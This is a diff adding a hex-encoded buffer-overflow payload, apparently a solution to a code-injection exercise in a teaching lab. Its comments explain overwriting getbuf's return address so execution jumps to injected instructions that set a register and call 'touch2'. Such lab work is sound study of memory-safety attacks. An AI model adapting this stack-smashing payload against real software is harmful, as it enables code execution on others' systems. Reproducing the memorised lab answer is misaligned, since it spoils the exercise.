@@ -1,0 +1,8 @@
+48 c7 c7 fa 97 b9 59        /* mov    $0x59b997fa,%rdi */
+48 c7 c4 89 dc 61 55        /* mov    $0x5561dc89,%rsp */
+c2 17 00                    /* retq   $0x17 */
+ec 17 40                    /* <touch2> */
+00 00 00 00 00 00 00 00     /* padding to for getbuf to override the return address */
+00 00 00 00 00 00 00        /* during runtime, the stack always start at 0x000000005561dc78 */
+00 00 00 00 00              /* we can make use of this vulnerability */
+78 dc 61 55
